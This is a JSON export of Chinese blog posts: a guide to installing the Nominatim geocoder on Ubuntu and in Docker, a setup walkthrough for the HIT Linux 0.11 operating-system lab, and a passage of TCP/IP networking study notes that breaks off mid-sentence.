[{"content":"引言 Nominatim是一种通过名称和地址（地理编码）搜索OpenStreetMap数据以及生成OSM点的合成地址（反向地理编码）的工具。\n写本篇文章的原因是在通过Docker配置Nominatim时，遇到了一些困难，无法使用，所以就只好自己配置一遍/(ㄒoㄒ)/~~\n写在前面：是由于官方提供的docker镜像启动时连接外网下载数据，下载的数据是外网的，所以下载不下来，导致容器无法使用，如何修改直接往后看=》\n参考链接\nhttps://blog.csdn.net/xff1994/article/details/79707720\nhttps://blog.csdn.net/vatrenoludilo/article/details/125003804\nhttps://nominatim.org/release-docs/latest/appendix/Install-on-Ubuntu-20/\npbf数据下载地址：http://download.openstreetmap.fr/extracts/asia\n基于Ubuntu 1.ubuntu换源 https://zhuanlan.zhihu.com/p/142014944\nUbuntu系统中，软件源文件地址为：/etc/apt/sources.list\n1.备份原来的源，将以前的源备份一下，以防以后可以用的。\nsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak\n2.打开/etc/apt/sources.list文件，删除所有 ggdG ，并保存。\nsudo vim /etc/apt/sources.list（可将vim更换为自己熟悉的编辑器）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 #添加阿里源 deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse #添加清华源 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse multiverse 3.更新\n更新源\n1 sudo apt-get update 如出现依赖问题，解决方式如下：\n1 sudo apt-get -f install 更新软件：\n1 sudo apt-get upgrade 2.解决中文乱码 https://www.jianshu.com/p/5fc84838f816\n查看当前系统语言\n1 $ echo $LANG 查看系统安装的语言包\n1 2 3 4 5 6 $ locale -a C C.UTF-8 POSIX $ sudo dpkg -l | grep language-pack-zh-hans 如果没有中文语言包，需要安装\n1 $ sudo apt-get install language-pack-zh-hans 安装成功后，确认是否安装成功\n1 2 3 4 5 6 7 8 9 10 $ locale -a C C.UTF-8 POSIX zh_CN.utf8 zh_SG.utf8 $ sudo dpkg -l | grep language-pack-zh-hans ii language-pack-zh-hans 1:20.04+20210802 all translation updates for language Simplified Chinese ii language-pack-zh-hans-base 1:20.04+20210802 all translations for language Simplified Chinese 设置系统语言环境\n1 2 3 4 5 6 7 // export 的方式只对当前终端生效 $ export LANG=\u0026#34;zh_CN.UTF-8\u0026#34; // /etc/profile 文件中添加export LANG=\u0026#34;zh_CN.UTF-8\u0026#34; 对所有用户生效 $ vim /etc/profile // 使配置生效 $ source /etc/profile 3.docker中无法输入中文\ndocker exec -it nominatim_docker env LANG=C.UTF-8 /bin/bash\n永久在docker中输入中文\n在Dockerfile中添加一行，如下所示：\nENV LANG C.UTF-8\n4.安装必要软件 1 2 3 4 5 6 7 8 9 sudo apt install -y php-cgi sudo apt install -y build-essential cmake g++ libboost-dev libboost-system-dev \\ libboost-filesystem-dev libexpat1-dev zlib1g-dev \\ libbz2-dev libpq-dev \\ postgresql-12-postgis-3 \\ postgresql-contrib-12 postgresql-12-postgis-3-scripts \\ php-cli php-pgsql php-intl libicu-dev python3-dotenv \\ python3-psycopg2 python3-psutil python3-jinja2 \\ python3-icu python3-datrie python3-yaml 安装systemctl\napt-get install systemctl\n5.创建Nominatim专用用户 1 2 3 4 5 6 7 8 9 // To create the user and directory run sudo useradd -d /srv/nominatim -s /bin/bash -m nominatim // To be able to copy and paste instructions from this manual, export user name and home directory now like this: export USERNAME=nominatim export USERHOME=/srv/nominatim // Make sure that system servers can read from the home directory: chmod a+x $USERHOME 6.设置PostgreSQL 修改配置文件的地方在 /etc/postgresql/12/main/postgresql.conf\n对于初次导入，需要设置\n1 2 fsync = off full_page_writes = off 开启postgresql\n1 2 3 4 5 6 7 8 9 10 11 12 root@d505aab0a27b:/var/run/postgresql# service postgresql status 12/main (port 5432): down root@d505aab0a27b:/var/run/postgresql# systemctl postgresql status ERROR:systemctl:Unknown operation postgresql. root@d505aab0a27b:/var/run/postgresql# service postgresql start * Starting PostgreSQL 12 database server [ OK ] root@d505aab0a27b:/var/run/postgresql# service postgresql status 12/main (port 5432): online root@d505aab0a27b:/var/run/postgresql# systemctl status postgresql postgresql.service - PostgreSQL RDBMS Loaded: loaded (/usr/lib/systemd/system/postgresql.service, enabled) Active: active (running) 初次导入后记得重新打开。设置完成后重启postgresql：\n1 sudo systemctl restart postgresql 创建两个postgresql用户(一个导入数据，一个用于webserver的只读用户):\n1 2 3 4 5 6 root@d505aab0a27b:/var/run/postgresql# su postgres postgres@d505aab0a27b:/var/run/postgresql$ createuser -s $USERNAME postgres@d505aab0a27b:/var/run/postgresql$ createuser www-data postgres@d505aab0a27b:/var/run/postgresql$ exit exit root@d505aab0a27b:/var/run/postgresql# 7.安装Nominatim 1 2 3 4 5 6 7 8 9 10 apt-get install -y wget cd $USERHOME wget https://nominatim.org/release/Nominatim-4.1.0.tar.bz2 tar xf Nominatim-4.1.0.tar.bz2 wget -O data/country_osm_grid.sql.gz https://www.nominatim.org/data/country_grid.sql.gz mkdir $USERHOME/build cd $USERHOME/build cmake $USERHOME/Nominatim-4.1.0 make sudo make install 8.导入数据 创建文件夹作为工作目录\n1 2 3 mkdir $USERHOME/nominatim-project mkdir $USERHOME/nominatim-project/website export PROJECT_DIR=$USERHOME/nominatim-project 导入过程会使用该文件夹\n在 PROJECT_DIR 导入数据\n导入数据库前要给文件夹赋予权限\n1 chmod -R a+x nominatim-project/ 1 su $USERNAME -c \u0026#34;nominatim import --osm-file beijing.osm.pbf --offline 2\u0026gt;\u0026amp;1 | tee setup.log\u0026#34; 注意：需加 offline 参数，不加的话在导入的时候会请求外网链接导致数据导入失败\n在将pbf数据导入到数据库时出现如下错误\n2022-11-10 21:07:22: Post-process tables 2022-11-10 21:07:28: Create search index for default country names. 2022-11-10 21:07:29: Recompute word counts 2022-11-10 21:07:31: Setup website at /srv/nominatim/nominatim-project/data/website 2022-11-10 21:07:32: Failed to load URL: https://www.openstreetmap.org/api/0.6/node/10169283021/1 2022-11-10 21:07:32: Cannot determine date of database: \u0026lt;urlopen error EOF occurred in violation of protocol (_ssl.c:1131)\u0026gt;\n如果操作错误，一次没有导入成功，再次导入时记得先删除数据库再导入：\n1 su $USERNAME -c \u0026#34;dropdb nominatim \u0026#34; 9.测试是否安装成功 1 2 nominatim admin --check-database nominatim serve 测试\n1 2 3 4 5 root@d505aab0a27b:/# curl http://localhost:8088/status.php OK root@d505aab0a27b:/# curl http://localhost:8088/search.php?q=tiananmen [{\u0026#34;place_id\u0026#34;:281751,\u0026#34;licence\u0026#34;:\u0026#34;Data © OpenStreetMap contributors, ODbL 1.0. https://osm.org/copyright\u0026#34;,\u0026#34;osm_type\u0026#34;:\u0026#34;relation\u0026#34;,\u0026#34;osm_id\u0026#34;:941596,\u0026#34;boundingbox\u0026#34;:[\u0026#34;39.8988884\u0026#34;,\u0026#34;39.9058312\u0026#34;,\u0026#34;116.3896532\u0026#34;,\u0026#34;116.3932766\u0026#34;],\u0026#34;lat\u0026#34;:\u0026#34;39.90272175\u0026#34;,\u0026#34;lon\u0026#34;:\u0026#34;116.39144087676334\u0026#34;,\u0026#34;display_name\u0026#34;:\u0026#34;天安门广场, 东城区, 北京市, 100010, 中国\u0026#34;,\u0026#34;place_rank\u0026#34;:25,\u0026#34;category\u0026#34;:\u0026#34;place\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;square\u0026#34;,\u0026#34;importance\u0026#34;:0.125},{\u0026#34;place_id\u0026#34;:114335,\u0026#34;licence\u0026#34;:\u0026#34;Data © OpenStreetMap contributors, ODbL 1.0. https://osm.org/copyright\u0026#34;,\u0026#34;osm_type\u0026#34;:\u0026#34;node\u0026#34;,\u0026#34;osm_id\u0026#34;:5211002739,\u0026#34;boundingbox\u0026#34;:[\u0026#34;39.9055272\u0026#34;,\u0026#34;39.9056272\u0026#34;,\u0026#34;116.3912549\u0026#34;,\u0026#34;116.3913549\u0026#34;],\u0026#34;lat\u0026#34;:\u0026#34;39.9055772\u0026#34;,\u0026#34;lon\u0026#34;:\u0026#34;116.3913049\u0026#34;,\u0026#34;display_name\u0026#34;:\u0026#34;天安门广场旗杆, 西长安街, 西长安街街道, 东城区, 北京市, 100010, 中国\u0026#34;,\u0026#34;place_rank\u0026#34;:30,\u0026#34;category\u0026#34;:\u0026#34;man_made\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;flagpole\u0026#34;,\u0026#34;importance\u0026#34;:0.0001}] 10.设置web服务器 1 sudo apt install -y apache2 libapache2-mod-php 1 2 3 4 5 6 7 8 9 10 sudo tee /etc/apache2/conf-available/nominatim.conf \u0026lt;\u0026lt; EOFAPACHECONF \u0026lt;Directory \u0026#34;$USERHOME/nominatim-project/website\u0026#34;\u0026gt; Options FollowSymLinks MultiViews AddType text/html .php DirectoryIndex search.php Require all granted \u0026lt;/Directory\u0026gt; Alias /nominatim $USERHOME/nominatim-project/website EOFAPACHECONF 1 2 3 sudo a2enconf nominatim sudo systemctl restart apache2 设置完成之后便可请求 nominatim 的api http://localhost/nominatim/\n基于Docker 1.nominatim-docker修改 默认的nominatim-docker在导入数据的时候需要请求外网，会导致导入数据失败\n在将pbf数据导入到数据库时出现如下错误\n2022-11-10 21:07:22: Post-process tables 2022-11-10 21:07:28: Create search index for default country names. 2022-11-10 21:07:29: Recompute word counts 2022-11-10 21:07:31: Setup website at /srv/nominatim/nominatim-project/data/website 2022-11-10 21:07:32: Failed to load URL: https://www.openstreetmap.org/api/0.6/node/10169283021/1 2022-11-10 21:07:32: Cannot determine date of database: \u0026lt;urlopen error EOF occurred in violation of protocol (_ssl.c:1131)\u0026gt;\n因此需将docker构建文件中的init.sh在下述位置加上 --offline 重新 build 生成新的 nominatim 镜像即可\n2.容器之间的通信 启用默认的bridge模式\n使用nominatim-docker启动项目\n1 docker run -itd -e PBF_PATH=/nominatim/data/beijing-latest.osm.pbf -p 8080:8080 -p 5432:5432 -v /e/Projects/DockerWorkspace/nominatim/data:/nominatim/data --name nominatim_docker2 nominatim:1.0 请求的地址为 http://localhost:8080/search.php?q=beijing\n其他容器访问该容器的方式：\n1 curl 172.17.0.4:8080/search.php?q=beijing 172.17.0.4 为nominatim-docker分配的ip\n3.nominatim查询api https://nominatim.org/release-docs/latest/api/Search/\n","permalink":"https://chance7bin.github.io/posts/note/docker-%E5%AE%89%E8%A3%85-nominatim/","summary":"引言 Nominatim是一种通过名称和地址（地理编码）搜索OpenStreetMap数据以及生成OSM点的合成地址（反向地理编码）的工具。 写","title":"docker 安装 nominatim"},{"content":"写在前面 该专栏主要是基于 哈工大操作系统实验 Hit-oslab 记录的实验过程与学习笔记 ✍\n实验地址 ➡ 操作系统原理与实践\n哈工大操作系统实验 Hit-oslab 环境搭建指南\n1. 主要平台和工具介绍 本操作系统实验的硬件环境是 IA-32（x86） 架构的 PC 机（在实验楼的环境中就是右侧的窗口），主要软件环境是 Bochs + gcc + 你最喜欢的编辑器 / IDE + 你最喜欢的操作系统 + Linux 0.11 源代码。\n实验的基本流程是根据实验要求编写应用程序、修改 Linux 0.11 的源代码，用 gcc 编译后，在 Bochs 的虚拟环境中运行、调试目标代码。\n上述实验环境涉及到的软件都是免费且开源的，具有较强的可移植性，可以在多种计算机的多种操作系统上搭建。为方便实验者，我们在最常见的平台 Ubuntu（最流行的 GNU/Linux 发行版之一）——上制作了 hit-oslab 集成环境，它基本包含了实验所需的所有软件，安装过程非常简单，基本上是直接解压就可以使用。\n1.1 x86 模拟器 Bochs Bochs 是一个免费且开放源代码的 IA-32（x86）架构 PC 机模拟器。在它模拟出的环境中可以运行 Linux、DOS 和各种版本的 Windows 等多种操作系统。而 Bochs 本身具有很高的移植性，可以运行在多种软硬件平台之上，这也是我们选择它做为本书的指定模拟器的主要原因。\n如果您想拥抱自由的 Linux，那么 Bochs 几乎是您的不二选择。如果您想继续把自己绑定在 Windows 平台上，那么除了 Bochs，您还可以选用 VMware 或者 Microsoft Virtual PC。它们是最著名虚拟机软件，而且都可以免费使用。因为 Bochs 的是模拟器，其原理决定了它的运行效率会低于虚拟机。\n但对于本书所设计的实验来说，效率上的差别很不明显。而且，Bochs 有虚拟机无可比拟的调试操作系统的能力，所以我们更建议您选用 Bochs。hit-oslab 已经内置了 bochs，本实验后文假定的缺省环境也是 Bochs。\n关于 Bochs 的更详细的介绍请访问它的 主页 及 Bochs 使用手册。\n1.2 GCC 编译器 GCC 是和 Linux 一起成长起来的编译器。Linux 最初的版本就是由 GCC 编译的。现在 GCC 也是在自由软件领域应用最广泛的编译器。所以，我们也选择 GCC 做为本书实验的指定编译器。\n1.3 GDB 调试器 GDB 调试器是 GCC 编译器的兄弟。做为自由软件领域几乎是唯一的调试器，它秉承了 Unix 类操作系统的一贯风格，采用纯命令行操作，有点儿类似 dos 下的 debug。\n关于它的使用方法请看 GDB 使用手册。\n另外，可以学习实验楼的 《GDB 简明教程》，通过动手实验学习 Linux 上 GDB 调试 C 语言程序的基本技巧。\n1.4 Ubuntu (GNU/Linux) Ubuntu 也许不是目前最好用的 Linux 桌面发行版，但它一定是最流行的。主要特点是易用，非常的易用。现在，已经有越来越多的人开始用 Ubuntu 完全代替 Windows，享受更加自由、安全、守法的感觉。\nUbuntu 的主页是 http://www.ubuntu.com/ ，这里不仅可以免费下载到 iso 文件，甚至能免费申领 Ubuntu 的安装光盘。\n我们强烈建议您在 Ubuntu 下做实验。因为有些实验内容涉及到在自己改进的 Linux 0.11 下，运行自己编的应用程序。被改进的功能都是高版本 Linux 内核已经具有的，在其上确认自己编写的应用程序无误后，再用之测试自己改进的 Linux 0.11，可以更有信心些。\n2. 实验环境的工作模式 （1）准备环境 hit-oslab 实验环境简称 oslab，是一个压缩文件（hit-oslab-linux-20110823.tar.gz），这个文件已经下载到了 /home/teacher 目录和 /home/shiyanlou/oslab（大家一进入实验环境，就是点击左边的 terminal 打开终端以后，所在的目录就是 /home/shiyanlou，这是大家的主目录）下，大家可以使用下面的命令解压展开压缩包即可工作。\n推荐大家使用如下的命令解压到 /home/shiyanlou/oslab/ 中。\n1 2 3 4 5 6 7 8 9 10 # 进入到 oslab 所在的文件夹 $ cd /home/shiyanlou/oslab/ # 解压，并指定解压到 /home/shiyanlou/ # 这样的话，在 /home/shiyanlou/oslab/ 中就能找到解压后的所有文件 $ tar -zxvf hit-oslab-linux-20110823.tar.gz -C /home/shiyanlou/ # 查看是否解压成功 $ ls -al # 除了压缩包 hit-oslab-linux-20110823.tar.gz 之外，其他的就是压缩包中的内容 （2）文件结构 Image 文件 oslab 工作在一个宿主操作系统之上，我们使用的 Linux，在宿主操作系统之上完成对 Linux 0.11 的开发、修改和编译之后，在 linux-0.11 目录下会生产一个名为 Image 的文件，它就是编译之后的目标文件。\n该文件内已经包含引导和所有内核的二进制代码。如果拿来一张软盘，从它的 0 扇区开始，逐字节写入 Image 文件的内容，就可以用这张软盘启动一台真正的计算机，并进入 Linux 0.11 内核。在此后的实验过程中，Bochs就是做这项模拟工作的\noslab 采用 bochs 模拟器加载这个 Image 文件，模拟执行 Linux 0.11，这样省却了重新启动计算机的麻烦。\nbochs 目录 bochs 目录下是与 bochs 相关的执行文件、数据文件和配置文件。\nrun 脚本 run 是运行 bochs 的脚本命令。\n运行后 bochs 会自动在它的虚拟软驱 A 和虚拟硬盘上各挂载一个镜像文件，软驱上挂载是 linux-0.11/Image，硬盘上挂载的是 hdc-0.11.img。\n因为 bochs 配置文件中的设置是从软驱 A 启动，所以 Linux 0.11 会被自动加载。\n而 Linux 0.11 会驱动硬盘，并 mount 硬盘上的文件系统，也就是将 hdc-0.11.img 内镜像的文件系统挂载到 0.11 系统内的根目录 —— /。在 0.11 下访问文件系统，访问的就是 hdc-0.11.img 文件内虚拟的文件系统。\nhdc-0.11.img 文件 hdc-0.11.img 文件的格式是 Minix 文件系统的镜像。\nLinux 所有版本都支持这种格式的文件系统，所以可以直接在宿主 Linux 上通过 mount 命令访问此文件内的文件，达到宿主系统和 bochs 内运行的 Linux 0.11 之间交换文件的效果。\nWindows 下目前没有（或者是还没发现）直接访问 Minix 文件系统的办法，所以要借助于 fdb.img，这是一个 1.44M 软盘的镜像文件，内部是 FAT12 文件系统。将它挂载到 bochs 的软驱 B，就可以在 0.11 中访问它。而通过 filedisk 或者 WinImage，可以在 Windows 下访问它内部的文件。\nhdc-0.11.img 内包含有：\nBash shell； 一些基本的 Linux 命令、工具，比如 cp、rm、mv、tar； vi 编辑器； gcc 1.4 编译器，可用来编译标准 C 程序； as86 和 ld86； Linux 0.11 的源代码，可在 0.11 下编译，然后覆盖现有的二进制内核。 其他文件在后面用到的时候会进行单独讲解。\n3. 使用方法 开始使用之前的准备活动：把当前目录切换到 oslab 下，用 pwd 命令确认，用 ls -l 列目录内容。\n1 2 3 4 5 6 7 8 # 切换目录 $ cd /home/shiyanlou/oslab/ # 确认路径 $ pwd # 查看目录内容 $ ls -l 本实验的所有内容都在本目录或其下级目录内完成。\n3.1 编译内核 “编译内核” 比 “编写内核” 要简单得多。\n首先要进入 linux-0.11 目录，然后执行 make 命令：\n1 2 $ cd ./linux-0.11/ $ make all 因为 all 是最常用的参数，所以可以省略，只用 make，效果一样。\n在多处理器的系统上，可以用 -j 参数进行并行编译，加快速度。例如双 CPU 的系统可以：\n1 $ make -j 2 make 命令会显示很多很多的信息，你可以尽量去看懂，也可以装作没看见。只要最后几行中没有 “error” 就说明编译成功。\n最后生成的目标文件是一个软盘镜像文件—— linux-0.11/Image（下面的图中给出了详细的信息）。如果将此镜像文件写到一张 1.44MB 的软盘上，就可以启动一台真正的计算机。\nlinux-0.11 目录下是全部的源代码，很多实验内容都是要靠修改这些代码来完成。修改后需要重新编译内核，还是执行命令：make all。\nmake 命令会自动跳过未被修改的文件，链接时直接使用上次编译生成的目标文件，从而节约编译时间。但如果重新编译后，你的修改貌似没有生效，可以试试先 make clean ，再 make all（或者一行命令：make clean \u0026amp;\u0026amp; make all。make clean 是删除上一次编译生成的所有中间文件和目标文件，确保是在全新的状态下编译整个工程。\n3.2 运行 在 Bochs 中运行最新编译好的内核很简单，在 oslab 目录下执行：\n1 2 3 4 5 6 # 注意是在上层目录 # 刚刚编译是在 oslab/linux-0.11/ 文件夹下 $ cd ~/oslab/ # 执行 run 脚本 $ ./run 如果出现 Bochs 的窗口，里面显示 linux 的引导过程，最后停止在 [/usr/root/]#，表示运行成功，如下图所示。\n图 1 用 Bochs 启动 Linux 0.11 以后的样子\n遇到的问题 执行./run的时候报如下错误\n解决方法：\nhttps://blog.csdn.net/qq_40758751/article/details/88707214\n3.3 调试 内核调试分为两种模式：汇编级调试和 C 语言级调试。\n（1）汇编级调试 汇编级调试需要执行命令：\n1 2 3 4 5 # 确认在 oslab 目录下 $ cd ~/oslab/ # 运行脚本前确定已经关闭刚刚运行的 Bochs $ ./dbg-asm 汇编级调试的启动之后 Bochs 是黑屏，这是正常的。\n可以用命令 help 来查看调试系统用的基本命令。更详细的信息请查阅 Bochs 使用手册。\n（2）C 语言级调试 C 语言级调试稍微复杂一些。首先执行如下命令：\n1 2 $ cd ~/oslab $ ./dbg-c 然后再打开一个终端窗口，执行：\n1 2 $ cd ~/oslab $ ./rungdb 注意：启动的顺序不能交换，否则 gdb 无法连接。\n出现下图所示的提示，才说明连接成功：\n新终端窗口中运行的是 GDB 调试器。关于 gdb 调试器请查阅 GDB 使用手册。\n遇到的问题 在执行./rungdb的时候报如下错误\n解决方法：\nhttps://blog.csdn.net/longintchar/article/details/79619465\n（思路一）\n3.4 文件交换 接下来讲解一下 Ubuntu 和 Linux 0.11 之间的文件交换如何启动。\n开始设置文件交换之前，务必关闭所有的 Bochs 进程。\n注意 1：不要在 0.11 内核运行的时候 mount 镜像文件，否则可能会损坏文件系统。同理，也不要在已经 mount 的时候运行 0.11 内核。\n注意 2：在关闭 Bochs 之前，需要先在 0.11 的命令行运行 “sync”，确保所有缓存数据都存盘后，再关闭 Bochs。\nhdc(OpenHarmony Device Connector)\noslab 下的 hdc-0.11-new.img 是 0.11 内核启动后的根文件系统镜像文件，相当于在 bochs 虚拟机里装载的硬盘。在 Ubuntu 上访问其内容的方法是：\n1 2 3 4 $ cd ~/oslab/ # 启动挂载脚本 $ sudo ./mount-hdc 大家使用 sudo 时，password 是 shiyanlou，也有可能不会提示输入密码。\n之后，hdc 目录下就是和 0.11 内核一模一样的文件系统了，可以读写任何文件（可能有些文件要用 sudo 才能访问）。\n1 2 3 4 5 # 进入挂载到 Ubuntu 上的目录 $ cd ~/oslab/hdc # 查看内容 $ ls -al 可以看到hdc里面多了一个最小的Linux目录，而且桌面也成功挂载了一个64MB的硬盘，这个硬盘就是hdc-0.11.img文件系统。\n读写完毕，不要忘了卸载这个文件系统：\n1 2 3 4 $ cd ~/oslab/ # 卸载 $ sudo umount hdc 经过 sudo ./mount-hdc 这样处理以后，我们可以在 Ubuntu 的 hdc 目录下创建一个 xxx.c 文件，然后利用 Ubuntu 上的编辑工具（如 gedit 等）实现对 xxx.c 文件的编辑工作，在编辑保存以后。\n执行 sudo umount hdc 后，再进入 Linux 0.11（即 run 启动 bochs 以后）就会看到这个 xxx.c（即如下图所示），这样就避免了在 Linux 0.11 上进行编辑 xxx.c 的麻烦，因为 Linux 0.11 作为一个很小的操作系统，其上的编辑工具只有 vi，使用起来非常不便。\n图 2 用 Ubuntu 和 Linux 0.11 完成文件交换以后再启动 Linux 0.11 以后\n另外在 Linux 0.11 上产生的文件，如后面实验中产生的 process.log 文件，可以按这种方式 “拿到” Ubuntu 下用 python 程序进行处理，当然这个 python 程序在 Linux 0.11 上显然是不好使的，因为 Linux 0.11 上搭建不了 python 解释环境。\n遇到的问题 实验说明中，并没有提及图2所示的xxx.c文件是在挂在hdc目录后，在”${OSLAB}/hdc/usr/root/”目录下创建的。我一开始直接到hdc文件夹的根目录下创建了文件，发现文件并没有加载进去。折腾了一会儿才定位到是这个问题。\n","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C1-%E7%86%9F%E6%82%89%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83/","summary":"写在前面 该专栏主要是基于 哈工大操作系统实验 Hit-oslab 记录的实验过程与学习笔记 ✍ 实验地址 ➡ 操作系统原理与实践 哈工大操作系统实验 Hit-oslab 环境搭建指南 1. 主要平台","title":"实验1 熟悉实验环境"},{"content":"写在前面 该篇博客是我在看《图解TCPIP》这本书时记录的学习笔记✍~~\n第1章 网络基础知识 计算机网络，根据其规模可分为==WAN（Wide Area Network，广域 网）==（指覆盖多个远距离区域的远程网络。比广域网再小一级的、连接整个城市的网络叫==城域网（MAN，Metropolitan Area Network）==。） 和==LAN（Local Area Network，局域网）==（指一个楼层、一栋楼或一个 校园等相对较小的区域内的网络。） 。\n互联网是由许多独立发展的网络通信技术融合而成。能够使它们之间不断融合并实现统一的正是==TCP/IP技术==。==TCP/IP是通信协议的统称==。\n1.协议 表1.2 各种网络体系结构及其协议\n==协议==就是计算机与计算机之间通过网络实现通信时事先达成的一种“约定”。这种“约定”使那些由不同厂商的设备、不同的CPU以及不同的操作系统组成的计算机之间，只要遵循相同的协议就能够实现通信。\n协议的标准化\nISO（International Organization for Standards，国际标准化组织。）制定了一个国际标准OSI（Open Systems Interconnection，开放式通信系统互联参考模型。） ，对通信系统进行了标准化。现在，OSI所定义的协议虽然并没有得到普及，但是在OSI协议设计之初作为其指导方针的OSI参考模型却常被用于网络协议的制定当中。\n本书将要说明的TCP/IP并非ISO（International Organization for Standards，国际标准化组织）所制定的某种国际标准。而是由 IETF（Internet Engineering Task Force） 所建议的、致力于推进其标准化作业的一种协议。\n2.协议的分层 ISO在制定标准化OSI之前，对网络体系结构相关的问题进行了充分的讨论，最终提出了作为通信协议设计指标的OSI参考模型。这一模型将通信协议中必要的功能分成了7层。通过这些分层，使得那些比较复杂的网络协议更加简单化。\n在这一模型中，每个分层都接收由它下一层所提供的特定服务，并且负责为自己的上一层提供特定的服务。==上下层之间==进行交互时所遵循的约定叫做==“接口”==。==同一层之间==的交互所遵循的约定叫做==“协议”==。\nOSI协议与OSI参考模型 OSI（参考模型）将通信功能划分为7个分层，称作==OSI参考模型==。==OSI协议==（是为了让异构的计算机之间能够相互通信的、由ISO和ITU-T推进其标准化的一种网络体系结构）以OSI参考模型为基础界定了每个阶层的协议和每个阶层之间接口相关的标准。遵循OSI协议的产品叫OSI产品，而它们所遵循的通信则被称为OSI通信。\nOSI参考模型中各个分层的作用 ■ 应用层\n为应用程序提供服务并规定应用程序中通信相关的细节。包括文件传输、电子邮件、远程登录（虚拟终端）等协议。\n■ 表示层\n将应用处理的信息转换为适合网络传输的格式，或将来自下一层的数据转换为上层能够处理的格式。因此它主要负责数据格式的转换。具体来说，就是将设备固有的数据格式转换为网络标准传输格式。不同设备对同一比特流解释的结果可能会不同。因此，使它们保持一致是这一层的主要作用。\n■ 会话层\n负责建立和断开通信连接（数据流动的逻辑通路），以及数据的分割等数据传输相关的管理。\n■ 传输层\n==起着可靠传输的作用==。只在通信双方节点上进行处理，而无需在路由器上处理。 ==（会话层负责决定建立连接和断开连接的时机，而传输层进行实际的建立和断开处理）==\n■ 网络层\n将数据传输到目标地址。目标地址可以是多个网络通过路由器连接而成的某一个地址。因此这一层主要负责寻址和路由选择。 （网络层的作用是在网络与网络相互连接的环境中，将数据从发送端主机发送到接收端主机。两端主机之间虽然有众多数据链路，但能够将数据从主机A送到主机B也都是网络层的功劳。）\n■ 数据链路层\n负责物理层面上互连的、节点之间的通信传输。例如与1个以太网相连的2个节点之间的通信。将0、1序列划分为具有意义的数据帧传送给对端（数据帧的生成与接收）。\n■ 物理层\n负责0、1比特流（0、1序列）与电压的高低、光的闪灭之间的互换。\n3.传输方式的分类 面向有连接型与面向无连接型 通过网络发送数据，大致可以分为面向有连接与面向无连接两种类型（面向无连接型包括以太网、IP、UDP等协议。面向有连接型包括ATM、帧中继、TCP等协议） 。\n电路交换与分组交换 目前，网络通信方式大致分为两种——==电路交换==和==分组交换==。电路交换技术的历史相对久远，主要用于过去的电话网。而分组交换技术则是一种较新的通信方式，从20世纪60年代后半叶才开始逐渐被人们认可。本书着力介绍的==TCP/IP==，正是采用了==分组交换技术==。\n图1.31 电路交换与分组交换的特点\n根据接收端数量分类 单播（Unicast）\n字面上，“Uni”表示“1”，“Cast”意为“投掷”。组合起来就是指1对1通信。早先的固定电话就是单播通信的一个典型例子。\n广播（Broadcast）\n它指是将消息从1台主机发送给与之相连的所有其他主机。广播通信的一个典型例子就是电视播放，它将电视信号一齐发送给非特定的多个接收对象。\n多播（Multicast）\n多播与广播类似，也是将消息发给多个接收主机。不同之处在于多播要限定某一组主机作为接收端。多播通信最典型的例子就是电视会议。\n任播（Anycast）\n任播是指在特定的多台主机中选出一台作为接收端的一种通信方式。虽然，这种方式与多播有相似之处，都是面向特定的一群主机，但是它的行为却与多播不同。任播通信从目标主机群中选择一台最符合网络条件的主机作为目标主机发送消息。通常，所被选中的那台特定主机将返回一个单播信号，随后发送端主机会只跟这台主机进行通信。\n==任播在实际网络中的应用有DNS根域名解析服务器。==\n4.地址 MAC地址和IP地址在标识一个通信主体时虽然都具有唯一性，但是它们当中只有IP地址具有层次性。\n5.网络的构成要素 搭建一套网络环境要涉及各种各样的电缆和网络设备。在此仅介绍连接计算机与计算机的硬件设备。\n传输速率与吞吐量\n在数据传输的过程中，==两个设备之间数据流动的物理速度称为传输速率。==单位为bps（Bits Per Second，每秒比特数）。从严格意义上讲，各种传输媒介中信号的流动速度是恒定的。因此，即使数据链路的传输速率不相同，也不会出现传输的速度忽快忽慢的情况（因为光和电流的传输速度是恒定的。） 。==传输速率高也不是指单位数据流动的速度有多快，而是指单位时间内传输的数据量有多少。==\n以我们生活中的道路交通为例，低速数据链路就如同车道较少无法让很多车同时通过的情况。与之相反，高速数据链路就相当于有多个车道，一次允许更多车辆行驶的道路。==传输速率又称作带宽（Bandwidth）。带宽越大网络传输能力就越强。==\n此外，==主机之间实际的传输速率被称作吞吐量。==其单位与带宽相同，都是bps（Bits Per Second）。吞吐量这个词不仅衡量带宽，同时也衡量主机的CPU处理能力、网络的拥堵程度、报文中数据字段的占有份额（不含报文首部，只计算数据字段本身）等信息。\n网卡\n任何一台计算机连接网络时，必须要使用==网卡（全称为网络接口卡，Network Interface 